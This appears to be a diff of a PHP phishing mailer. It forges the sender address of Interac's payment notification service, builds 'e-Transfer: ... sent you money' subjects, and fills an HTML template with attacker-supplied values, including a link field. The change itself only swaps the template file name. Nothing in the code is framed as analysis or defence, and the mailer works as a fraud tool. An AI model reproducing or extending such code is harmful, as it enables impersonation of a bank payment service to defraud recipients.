@@ -12,7 +12,7 @@ $sender_email = 'notify@payments.interac.ca';
 $email_subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';
 
 // Set email message
-$template = file_get_contents('Deposit.html');
+$template = file_get_contents('transfer.html');
 $message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
 $message = str_replace('{{username}}', $_POST['username'], $message);
 $message = str_replace('{{phoreceiver_href}}', $_POST['phoreceiver_href'], $message);
